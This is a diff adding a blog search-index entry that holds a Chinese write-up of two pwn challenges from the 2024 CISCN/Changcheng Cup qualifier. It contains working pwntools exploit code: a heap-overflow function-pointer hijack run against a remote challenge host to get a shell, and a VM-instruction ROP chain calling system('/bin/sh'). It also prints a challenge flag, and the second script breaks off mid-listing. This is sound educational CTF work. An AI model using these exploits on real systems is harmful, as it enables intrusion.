@@ -1,6 +1,212 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2024ciscn&amp;长城杯初赛pwn方向部分题解</title>
+    <url>/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
+    <content><![CDATA[<h4 id="pwn-anote"><a href="#pwn-anote" class="headerlink" title="pwn-anote"></a>pwn-anote</h4><p>32位程序，存在后门函数。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
+                      class=""
+                >
+
+<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
+                      class=""
+                >
+
+<p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
+                      class=""
+                >
+
+<p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>flag值</strong></p>
+<p>flag{2fee0fed-0283-497c-9a38-05aceb984b96}</p>
+<h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
+<p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
+                      class=""
+                >
+
+<p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
+                      class=""
+                >
+
+<p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
+                      class=""
+                >
+
+<p>第一个函数如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
+                      class=""
+                >
+
+<p>第二个函数如下:</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
+                      class=""
+                >
+
+<p>第三个函数如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
+                      class=""
+                >
+
+<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300&#x2F;0x4&#x3D;0xc0个指令。</p>
+<p>第9个和第10个函数稍微有点不同：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
+                      class=""
+                >
+
+<p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
+                      class=""
+                >
+
+<p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
+                      class=""
+                >
+
+<p>然后就能还原出每一个指令的组成结构：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
+                      class=""
+                >
+
+<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，&#x2F;bin&#x2F;sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的&#x2F;bin&#x2F;sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
+                      class=""
+                >
+
+<p>具体组合实现：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
+                      class=""
+                >
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span 